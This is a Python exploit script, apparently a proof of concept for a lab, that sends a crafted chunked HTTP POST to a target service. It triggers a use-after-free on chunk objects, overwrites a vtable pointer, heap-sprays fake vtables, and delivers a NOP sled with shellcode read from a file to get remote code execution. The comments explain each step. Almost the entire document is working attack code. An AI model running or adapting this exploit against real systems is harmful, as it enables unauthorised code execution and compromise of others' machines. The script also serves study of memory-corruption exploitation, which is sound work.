#!/usr/bin/env python3


import struct
from argparse import ArgumentParser
from base64 import b64encode
from functools import partial
from http.client import HTTPConnection


POINTER_SIZE = 4
CHUNK_OBJECT_SIZE = 12
# Threshold for the buffer size above which the address specified with --buffer-address is always included in the buffer
# with a 32-bit executable. To even get different start addresses for buffers of this size, we need to increase the number
# of random bits for mmap() by setting /proc/sys/vm/mmap_rnd_compat_bits to 14, the default seems to be 8. With 16 bits,
# the maximum, we'd need a buffer size of probably 1GB.
FIXED_ADDR_BUFFER_SIZE_THRESHOLD = 0x06400000  # 100MB
NOP_OPCODE = b"\x90"


def main():
    parser = ArgumentParser()
    parser.add_argument("--target-host", "-H", default="localhost")
    parser.add_argument("--target-port", "-P", type=int, default=9999)
    parser.add_argument("--buffer-address", type=partial(int, base=16), required=True)
    parser.add_argument("--shellcode-file", required=True)
    args = parser.parse_args()

    with open(args.shellcode_file, "rb") as f:
        shellcode = f.read()

    conn = HTTPConnection(args.target_host, args.target_port)
    conn.connect()
    input("Press any key to send request... ")
    conn.request(
        "POST",
        "/",
        headers={
            "Content-Type": "application/octet-stream",
            "Transfer-Encoding": "chunked"
        },
        encode_chunked=True,
        body=[
            # 1st chunk with incorrectly base64-encoded data (just one character) that results in an error when the
            # victim tries to decode it. The corresponding chunk object will be overwritten by the 2nd chunk.
            b"x",

            # 2nd chunk, contains the pointer to the fake vtable delivered in the 3rd chunk. The size of the
            # base64-decoded data has to match the size of the chunk objects so the buffer for the decoded
            # data will re-use the memory of the freed object from chunk 1. Thereby we replace the original vtable.
            b64encode(
                struct.pack("<L", args.buffer_address) +   # pointer to vtable
                b"x" * (CHUNK_OBJECT_SIZE - POINTER_SIZE)  # to fill the buffer
            ),

            # 3rd chunk
            # We construct a fake vtable with pwned_destructor() as a replacement for the real destructor(s).
            # See https://shaharmike.com/cpp/vtable-part1/ and
            # https://www.martinkysel.com/demystifying-virtual-tables-in-c-part-3-virtual-tables/ for details.
            # To account for different start addresses of the buffer for the decoded chunk, we heap-spray the
            # complete buffer with instances of the vtable and use an address that is guaranteed to be in the buffer as
            # pointer to the vtable in the 2nd chunk.
            # We apply the same principle to the pointers in the vtable. They point to an address that's guaranteed
            # to be in the buffer for the 4th chunk, somewhere in the NOP sled.
            b64encode(b"".join(
                [
                    struct.pack("<L", args.buffer_address - FIXED_ADDR_BUFFER_SIZE_THRESHOLD)
                    for x in range(0, int(FIXED_ADDR_BUFFER_SIZE_THRESHOLD / POINTER_SIZE))
                ]
            )),

            # 4th chunk, contains a NOP sled and the shell code
            b64encode(
                NOP_OPCODE * (FIXED_ADDR_BUFFER_SIZE_THRESHOLD - len(shellcode)) + shellcode
            ),
        ]
    )
    resp = conn.getresponse()
    print(f"Target replied with status {resp.status} {resp.reason}")

    input("Press any key to close connection...")
    conn.close()


if __name__ == '__main__':
    main()
